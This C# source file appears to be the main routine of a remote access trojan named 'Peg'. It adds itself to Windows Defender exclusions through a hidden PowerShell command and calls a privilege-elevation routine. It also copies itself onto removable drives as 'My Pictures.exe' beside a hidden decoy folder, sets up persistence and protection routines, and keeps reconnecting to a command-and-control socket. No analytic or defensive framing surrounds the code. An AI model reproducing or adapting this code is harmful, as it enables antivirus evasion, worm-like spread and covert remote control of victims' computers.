using Peg.ICARUS;
using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;

namespace Peg
{
    public class Program
    {
        private static string reupload(string str)
        {
            var ch1 = '\n';
            var stringBuilder = new StringBuilder();

            foreach (uint num in str.ToCharArray())
            {
                var ch2 = (char)(num ^ ch1);
                stringBuilder.Append(ch2);
            }

            return stringBuilder.ToString();
        }

        public static void Main()
        {

            for (var i = 0; i < Convert.ToInt32(Settings.De_lay); i++) Thread.Sleep(1000);

            if (!Settings.InitializeSettings()) Environment.Exit(0);

            if (Regex.IsMatch(Settings.Exclude, "true"))
                Process.Start(new ProcessStartInfo
                {
                    FileName = "cmd",
                    Arguments =
                        $"/k start /b powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath {Process.GetCurrentProcess().MainModule.FileName} & exit",
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    UseShellExecute = true,
                    ErrorDialog = false
                });

            if (Regex.IsMatch(Settings.AlphaOmega, "true"))
                if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
                    Sucks.suck(Process.GetCurrentProcess().MainModule.FileName);

            //if (Regex.IsMatch(Settings.Aspida, "true")) Ektelesths.Run();

            if (Regex.IsMatch(Settings.USB, "true"))
                try
                {
                    var path = Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\MRT.exe";
                    var currpath = Assembly.GetExecutingAssembly();
                    var fullProcPath = Environment.GetCommandLineArgs()[0];

                loop11:
                    Thread.Sleep(2522);
                    var c = new DriveInfo(@"C:\");
                    if (c.IsReady)
                    {
                        if (c.DriveType == DriveType.Fixed) goto loop1;

                        try
                        {
                            File.Copy(fullProcPath, "C:\\My Pictures.exe");
                            if (File.Exists("C:\\My Pictures.exe"))
                                try
                                {
                                    Directory.CreateDirectory("C:\\My Pictures");
                                    File.SetAttributes("C:\\My Pictures", FileAttributes.Hidden);
                                }
                                catch
                                {
                                }
                        }
                        catch
                        {
                        }
                    }

                loop1:
                    var d = new DriveInfo(@"D:\");
                    if (d.IsReady)
                    {
                        if (d.DriveType == DriveType.Fixed) goto loop2;

                        try
                        {
                            File.Copy(fullProcPath, "D:\\My Pictures.exe");
                            if (File.Exists("D:\\My Pictures.exe"))
                                try
                                {
                                    Directory.CreateDirectory("D:\\My Pictures");
                                    File.SetAttributes("D:\\My Pictures", FileAttributes.Hidden);
                                }
                                catch
                                {
                                }
                        }
                        catch
                        {
                        }
                    }

                loop2:
                    var e = new DriveInfo(@"E:\");
                    if (e.IsReady)
                    {
                        if (e.DriveType == DriveType.Fixed) goto loop3;

                        try
                        {
                            File.Copy(fullProcPath, "E:\\My Pictures.exe");
                            if (File.Exists("E:\\My Pictures.exe"))
                                try
                                {
                                    Directory.CreateDirectory("E:\\My Pictures");
                                    File.SetAttributes("E:\\My Pictures", FileAttributes.Hidden);
                                }
                                catch
                                {
                                }
                        }
                        catch
                        {
                        }
                    }

                loop3:
                    var f = new DriveInfo(@"F:\");
                    if (f.IsReady)
                    {
                        if (f.DriveType == DriveType.Fixed) goto loop4;

                        try
                        {
                            File.Copy(fullProcPath, "F:\\My Pictures.exe");
                            if (File.Exists("F:\\My Pictures.exe"))
                                try
                                {
                                    Directory.CreateDirectory("F:\\My Pictures");
                                    File.SetAttributes("F:\\My Pictures", FileAttributes.Hidden);
                                }
                                catch
                                {
                                }
                        }
                        catch
                        {
                        }
                    }

                loop4:
                    var g = new DriveInfo(@"G:\");
                    if (g.IsReady)
                    {
                        if (g.DriveType == DriveType.Fixed) goto loop5;

                        try
                        {
                            File.Copy(fullProcPath, "G:\\My Pictures.exe");
                            if (File.Exists("G:\\My Pictures.exe"))
                                try
                                {
                                    Directory.CreateDirectory("G:\\My Pictures");
                                    File.SetAttributes("G:\\My Pictures", FileAttributes.Hidden);
                                }
                                catch
                                {
                                }
                        }
                        catch
                        {
                        }
                    }

                loop5:
                    var h = new DriveInfo(@"H:\");
                    if (h.IsReady)
                    {
                        if (h.DriveType == DriveType.Fixed) goto loop6;

                        try
                        {
                            File.Copy(fullProcPath, "H:\\My Pictures.exe");
                            if (File.Exists("H:\\My Pictures.exe"))
                                try
                                {
                                    Directory.CreateDirectory("H:\\My Pictures");
                                    File.SetAttributes("H:\\My Pictures", FileAttributes.Hidden);
                                }
                                catch
                                {
                                }
                        }
                        catch
                        {
                        }
                    }

                loop6:
                    var i = new DriveInfo(@"I:\");
                    if (i.IsReady)
                        if (i.DriveType == DriveType.Fixed)
                            goto loop7;
                    try
                    {
                        File.Copy(fullProcPath, "I:\\My Pictures.exe");
                        if (File.Exists("I:\\My Pictures.exe"))
                            try
                            {
                                Directory.CreateDirectory("I:\\My Pictures");
                                File.SetAttributes("I:\\My Pictures", FileAttributes.Hidden);
                            }
                            catch
                            {
                            }
                    }
                    catch
                    {
                    }

                loop7:
                    var j = new DriveInfo(@"J:\");
                    if (j.IsReady)
                    {
                        if (j.DriveType == DriveType.Fixed) goto loop8;

                        try
                        {
                            File.Copy(fullProcPath, "J:\\My Pictures.exe");
                            if (File.Exists("J:\\My Pictures.exe"))
                                try
                                {
                                    Directory.CreateDirectory("J:\\My Pictures");
                                    File.SetAttributes("J:\\My Pictures", FileAttributes.Hidden);
                                }
                                catch
                                {
                                }
                        }
                        catch
                        {
                        }
                    }

                loop8:
                    var k = new DriveInfo(@"K:\");
                    if (k.IsReady)
                    {
                        if (k.DriveType == DriveType.Fixed) goto loop9;

                        try
                        {
                            File.Copy(fullProcPath, "K:\\My Pictures.exe");
                            if (File.Exists("K:\\My Pictures.exe"))
                                try
                                {
                                    Directory.CreateDirectory("K:\\My Pictures");
                                    File.SetAttributes("K:\\My Pictures", FileAttributes.Hidden);
                                }
                                catch
                                {
                                }
                        }
                        catch
                        {
                        }
                    }

                loop9:
                    var l = new DriveInfo(@"L:\");
                    if (l.IsReady)
                    {
                        if (l.DriveType == DriveType.Fixed) goto loop10;

                        try
                        {
                            File.Copy(fullProcPath, "L:\\My Pictures.exe");
                            if (File.Exists("L:\\My Pictures.exe"))
                                try
                                {
                                    Directory.CreateDirectory("L:\\My Pictures");
                                    File.SetAttributes("L:\\My Pictures", FileAttributes.Hidden);
                                }
                                catch
                                {
                                }
                        }
                        catch
                        {
                        }
                    }

                loop10:
                    var m = new DriveInfo(@"M:\");
                    if (m.IsReady)
                    {
                        if (m.DriveType == DriveType.Fixed) goto loop11;

                        try
                        {
                            File.Copy(fullProcPath, "M:\\My Pictures.exe");
                            if (File.Exists("M:\\My Pictures.exe"))
                                try
                                {
                                    Directory.CreateDirectory("M:\\My Pictures");
                                    File.SetAttributes("M:\\My Pictures", FileAttributes.Hidden);
                                }
                                catch
                                {
                                }
                        }
                        catch
                        {
                        }
                    }
                }
                catch
                {
                }

            try
            {
                if (Convert.ToBoolean(Settings.Prostaths))
                    Prostaths.Trexa();

                if (!MutexControl.CreateMutex())
                    Environment.Exit(0);

                if (Convert.ToBoolean(Settings.ProstathsYlhs))
                    ProstathsYlhs.Arxiko();

                if (Convert.ToBoolean(Settings.ODBS) && Me8odos.IsAdmin())
                    Prostasia.Set();

                if (Convert.ToBoolean(Settings.Egkatastash))
                    Ekinhsh.egkatasthsh();

                Me8odos.PreventSleep();

                if (Me8odos.IsAdmin())
                    Me8odos.ClearSetting();

                IMSA.Abyss();
            }
            catch
            {
            }

            while (true)
            {
                try
                {
                    if (!PegSock.IsConnected)
                    {
                        PegSock.Reconnect();
                        PegSock.InitializeClient();
                    }
                }
                catch
                {
                }

                Thread.Sleep(5000);
            }
        }
    }
}